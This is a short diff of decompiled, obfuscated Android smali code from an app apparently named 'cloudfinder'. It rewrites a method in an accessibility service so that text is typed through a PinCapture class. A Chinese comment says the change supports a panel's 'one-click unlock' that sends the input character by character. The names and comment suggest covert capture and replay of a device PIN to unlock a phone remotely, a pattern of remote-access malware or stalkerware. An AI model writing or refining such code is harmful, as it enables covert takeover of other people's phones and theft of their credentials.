@@ -14285,33 +14285,11 @@
 .end method
 
 .method public final ؿ(Ljava/lang/String;)V
-    .locals 3
+    .locals 0
 
-    :try_start_0
-    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
+    # 2.2：inputSend 改为累计后整体 SET_TEXT（面板一键解锁逐字符发送，避免被覆盖）
+    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->typeText(Ljava/lang/String;)V
 
-    new-instance v0, Ljava/lang/Thread;
-
-    new-instance v1, Lڛڜڕڰڑ/؋;
-
-    const/4 v2, 0x4
-
-    invoke-direct {v1, p0, p1, v2}, Lڛڜڕڰڑ/؋;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;Ljava/lang/String;I)V
-
-    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
-
-    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
-    :try_end_0
-    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
-
-    goto :goto_0
-
-    :catch_0
-    move-exception p1
-
-    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V
-
-    :goto_0
     return-void
 .end method
 
